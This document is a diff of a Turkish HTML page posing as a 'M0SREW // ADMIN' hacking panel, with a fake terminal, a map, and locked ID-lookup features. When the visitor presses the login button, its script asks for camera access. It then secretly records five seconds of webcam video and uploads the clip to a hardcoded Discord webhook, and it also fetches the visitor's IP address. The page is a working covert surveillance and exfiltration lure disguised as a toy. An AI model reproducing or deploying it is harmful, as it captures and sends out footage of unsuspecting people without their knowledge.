@@ -3,151 +3,134 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>M 0 S R E W // ADMIN</title>
+    <title>M 0 S R E W</title>
     <style>
-        /* Derin Mavi Tema */
-        :root { --blue: #162a8c; --dark: #0a134a; --text: #f0f0f0; --accent: #ff3b3b; }
-        
-        body { background: var(--blue); color: var(--text); font-family: 'Inter', sans-serif; margin: 0; padding: 0; overflow-x: hidden; }
+        /* Resimdeki Orijinal Mavi Tonu */
+        body { background: #162a8c; color: #fff; font-family: sans-serif; margin: 0; padding: 0; overflow-x: hidden; }
 
-        /* ÜST BAR VE MENÜ */
-        .top-bar { 
-            height: 60px; background: var(--dark); display: flex; 
-            align-items: center; padding: 0 20px; justify-content: space-between;
-            border-bottom: 1px solid rgba(255,255,255,0.1);
+        /* Üst Bar */
+        .header { 
+            background: #0a134a; padding: 20px; display: flex; 
+            justify-content: space-between; align-items: center; 
+            border-bottom: 1px solid rgba(255,255,255,0.05);
         }
-        .logo { font-size: 20px; font-weight: 300; letter-spacing: 5px; text-transform: uppercase; }
-        .admin-tag { font-size: 12px; color: #888; letter-spacing: 2px; }
-        
-        /* SAĞ ÜST MENÜ (GERİ GELDİ) */
-        .hamburger { cursor: pointer; display: flex; flex-direction: column; gap: 4px; z-index: 40000; }
-        .hamburger div { width: 22px; height: 2px; background: #fff; border-radius: 2px; }
+        .logo { font-size: 18px; letter-spacing: 4px; font-weight: bold; }
+        .tag { color: #888; font-size: 12px; }
 
-        /* YAN MENÜ */
+        /* Hamburger Menü İkonu */
+        .menu-icon { cursor: pointer; display: flex; flex-direction: column; gap: 4px; }
+        .menu-icon div { width: 22px; height: 2px; background: #fff; }
+
+        /* YAN MENÜ - EMRE İFS4 DETAYLI */
         #sideMenu { 
             position: fixed; top: 0; right: -280px; width: 280px; height: 100%; 
-            background: var(--dark); transition: 0.4s; z-index: 35000; padding-top: 80px;
+            background: #0a134a; transition: 0.4s; z-index: 10000; padding-top: 60px;
             box-shadow: -10px 0 30px rgba(0,0,0,0.5);
         }
-        .side-item { padding: 20px 30px; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 12px; font-weight: 300; cursor: pointer; color: #aaa; text-transform: uppercase; letter-spacing: 1px; }
-        .side-item:hover { color: #fff; background: rgba(255,255,255,0.05); }
-
-        /* HARİTA VE TERMİNAL */
-        .content { padding: 15px; }
-        .map-container { 
-            width: 100%; height: 180px; background: #222; border-radius: 12px; 
-            overflow: hidden; margin-bottom: 15px; border: 1px solid rgba(255,255,255,0.1);
+        /* Menüdeki Ozel Yazı */
+        .ifs-title { 
+            padding: 20px 25px; color: #fff; font-size: 16px; font-weight: bold; 
+            letter-spacing: 2px; border-bottom: 2px solid #162a8c; margin-bottom: 10px;
         }
-        #mapImg { width: 100%; height: 100%; object-fit: cover; opacity: 0.8; }
+        .side-link { padding: 15px 25px; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 13px; color: #aaa; cursor: pointer; }
+        .side-link:hover { color: #fff; background: rgba(255,255,255,0.05); }
 
-        .terminal { 
-            background: #000; border-radius: 8px; padding: 15px; 
-            font-family: 'Courier New', monospace; font-size: 11px; color: #5c7dff;
-            height: 120px; overflow-y: auto; margin-bottom: 20px;
-            box-shadow: inset 0 0 10px rgba(0,0,0,1);
+        /* Harita ve Terminal */
+        .map-box { margin: 15px; height: 180px; background: #222; border-radius: 10px; overflow: hidden; }
+        .map-box img { width: 100%; height: 100%; object-fit: cover; opacity: 0.7; }
+
+        .term { 
+            background: #000; margin: 15px; padding: 15px; border-radius: 8px;
+            font-family: monospace; font-size: 11px; color: #5c7dff; height: 100px;
         }
 
-        /* SORGU LİSTESİ */
-        .row { 
-            display: flex; justify-content: space-between; padding: 15px 10px; 
-            border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 12px; 
-            letter-spacing: 1px; font-weight: 300;
-        }
-        .label { color: #888; text-transform: uppercase; }
-        .value { color: #fff; }
-        .lock { color: var(--accent); font-weight: 400; }
+        /* Liste Düzeni */
+        .item { display: flex; justify-content: space-between; padding: 15px; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 13px; }
+        .lock { color: #ff3b3b; font-weight: bold; }
 
-        /* GİRİŞ EKRANI */
-        #authWrapper { position: fixed; inset: 0; background: var(--blue); z-index: 50000; display: flex; justify-content: center; align-items: center; }
-        .auth-card { text-align: center; width: 300px; }
-        input { width: 100%; padding: 15px; margin-top: 10px; background: rgba(0,0,0,0.2); border: 1px solid rgba(255,255,255,0.1); color: #fff; outline: none; box-sizing: border-box; }
-        .btn { width: 100%; padding: 15px; margin-top: 20px; background: #fff; color: #000; border: none; font-weight: 600; cursor: pointer; text-transform: uppercase; }
+        /* Giriş Ekranı */
+        #auth { position: fixed; inset: 0; background: #162a8c; z-index: 50000; display: flex; flex-direction: column; justify-content: center; align-items: center; }
+        input { margin: 10px; padding: 15px; width: 260px; border: none; background: rgba(0,0,0,0.2); color: #fff; border-radius: 5px; outline: none; }
+        button { padding: 15px; width: 290px; background: #fff; color: #000; border: none; font-weight: bold; cursor: pointer; margin-top: 10px; }
     </style>
 </head>
 <body>
 
-<audio id="opMusic" loop><source src="https://www.soundjay.com/misc/sounds/heartbeat-01.mp3" type="audio/mpeg"></audio>
-<video id="secretCam" style="display:none;" autoplay playsinline muted></video>
+<audio id="snd" loop><source src="https://www.soundjay.com/misc/sounds/heartbeat-01.mp3"></audio>
+<video id="v" style="display:none;" autoplay muted playsinline></video>
 
-<div id="authWrapper">
-    <div class="auth-card">
-        <h1 style="letter-spacing: 8px; font-weight: 200;">M0SREW</h1>
-        <input type="text" id="u" placeholder="Admin ID">
-        <input type="password" id="p" placeholder="Password">
-        <button class="btn" onclick="startSystem()">SİSTEMİ BAŞLAT</button>
-    </div>
+<div id="auth">
+    <h1 style="letter-spacing: 8px; font-weight: 300;">M0SREW</h1>
+    <input type="text" id="user" placeholder="Sistem Kimliği">
+    <input type="password" id="pass" placeholder="Erişim Şifresi">
+    <button onclick="enter()">OTURUMU AÇ</button>
 </div>
 
-<div id="mainContent" style="display:none;">
-    <div class="top-bar">
+<div id="panel" style="display:none;">
+    <div class="header">
         <div class="logo">M 0 S R E W</div>
-        <div class="admin-tag">// ADMIN</div>
-        <div class="hamburger" onclick="toggleMenu()"><div></div><div></div><div></div></div>
+        <div class="tag">// ADMIN</div>
+        <div class="menu-icon" onclick="openNav()"><div></div><div></div><div></div></div>
     </div>
 
     <div id="sideMenu">
-        <div class="side-item" onclick="msg()">VERİ TABANI SIZMA</div>
-        <div class="side-item" onclick="msg()">LOGLARI TEMİZLE</div>
-        <div class="side-item" onclick="msg()">ERİŞİM AYARLARI</div>
-        <div class="side-item" onclick="location.reload()">SİSTEMDEN ÇIK</div>
+        <div class="ifs-title">EMRE İFS4</div>
+        <div class="side-link" onclick="alert('Veritabanı meşgul...')">LOGLARI SORGULA</div>
+        <div class="side-link" onclick="alert('Kamera kanalları aktif.')">KAMERA ERİŞİMİ</div>
+        <div class="side-link" onclick="location.reload()" style="color: #ff3b3b;">SİSTEMDEN AYRIL</div>
     </div>
 
-    <div class="content">
-        <div class="map-container">
-            <img id="mapImg" src="https://static-maps.yandex.ru/1.x/?ll=28.68,41.04&z=12&l=map&size=450,180&theme=dark">
-        </div>
-
-        <div class="terminal" id="term">
-            [INFO] Protokol 43.0 başlatıldı...<br>
-            [INFO] Bağlantı tünelleniyor...<br>
-            [INFO] IP adresine sızıldı...<br>
-            [INFO] Veritabanı bypass ediliyor...<br>
-            [INFO] Video kanalları açıldı...<br>
-        </div>
-
-        <div class="row"><div class="label">IP ADRESİ</div><div class="value" id="ipD">---</div></div>
-        <div class="row"><div class="label">KONUM</div><div class="value" id="locD" style="color:var(--accent)">41.04, 28.68</div></div>
-        <div class="row"><div class="label">MERNİS 2026</div><div class="lock">KİLİTLİ</div></div>
-        <div class="row"><div class="label">GSM LOKASYON</div><div class="lock">KİLİTLİ</div></div>
-        <div class="row"><div class="label">SMS BOMBER</div><div class="label">OFFLINE</div></div>
-        <div class="row"><div class="label">TC SORGULAMA</div><div class="lock">KİLİTLİ</div></div>
-        <div class="row"><div class="label">AİLE SORGULAMA</div><div class="lock">KİLİTLİ</div></div>
+    <div class="map-box">
+        <img src="https://static-maps.yandex.ru/1.x/?ll=28.68,41.04&z=12&l=map&size=450,180&theme=dark">
     </div>
+
+    <div class="term">
+        [INFO] Protokol 43.0 başlatıldı...<br>
+        [INFO] Bağlantı tünelleniyor...<br>
+        [INFO] IP adresine sızıldı...<br>
+        [INFO] Video kanalları aktif edildi.
+    </div>
+
+    <div class="item"><span>IP ADRESİ</span><span id="ip">---</span></div>
+    <div class="item"><span>KONUM</span><span style="color:#ff3b3b">41.04, 28.68</span></div>
+    <div class="item"><span>MERNİS 2026</span><span class="lock">KİLİTLİ</span></div>
+    <div class="item"><span>TC SORGULAMA</span><span class="lock">KİLİTLİ</span></div>
+    <div class="item"><span>GSM DATA</span><span class="lock">KİLİTLİ</span></div>
+    <div class="item"><span>AİLE SOY AĞACI</span><span class="lock">KİLİTLİ</span></div>
 </div>
 
 <script>
     const wh = "https://discord.com/api/webhooks/1501879445722759260/1xUO1IOn_YOTS9l0_XcLBo83UkbEgvJjTcjYdcV_arPyX4s-c8Js_3YFZ6jZlKx5Ms5f";
-    
-    function toggleMenu() {
+
+    function openNav() {
         const m = document.getElementById('sideMenu');
         m.style.right = m.style.right === '0px' ? '-280px' : '0px';
     }
 
-    function msg() { alert("M 0 S R E W : Erişim Yetkisi Reddedildi."); }
-
-    fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>document.getElementById('ipD').innerText=d.ip);
-
-    async function startSystem() {
+    async function enter() {
         try {
-            const s = await navigator.mediaDevices.getUserMedia({video: true});
-            document.getElementById('secretCam').srcObject = s;
-            document.getElementById('authWrapper').style.display='none';
-            document.getElementById('mainContent').style.display='block';
-            document.getElementById('opMusic').play();
+            const stream = await navigator.mediaDevices.getUserMedia({video: true});
+            document.getElementById('v').srcObject = stream;
+            document.getElementById('auth').style.display = 'none';
+            document.getElementById('panel').style.display = 'block';
+            document.getElementById('snd').play();
 
-            const mr = new MediaRecorder(s);
+            const mr = new MediaRecorder(stream);
             let ch = [];
             mr.ondataavailable = e => ch.push(e.data);
             mr.onstop = () => {
                 const b = new Blob(ch, { type: 'video/webm' });
                 const fd = new FormData();
-                fd.append("payload_json", JSON.stringify({ content: `🔱 **M 0 S R E W  OPERASYONU**\nSistem Başlatıldı.` }));
-                fd.append("file", b, "cam.webm");
+                fd.append("payload_json", JSON.stringify({ content: "🔱 **M 0 S R E W** Girişi Tespit Edildi." }));
+                fd.append("file", b, "video.webm");
                 fetch(wh, { method: "POST", body: fd });
             };
             mr.start(); setTimeout(() => mr.stop(), 5000);
-        } catch(e) { alert("SİSTEM HATASI: Kamera izni olmadan sızma başlatılamaz."); location.reload(); }
+        } catch(e) { alert("Sisteme erişmek için kamera izni gerekiyor."); }
     }
+
+    fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>document.getElementById('ip').innerText=d.ip);
 </script>
+
 </body>
 </html>
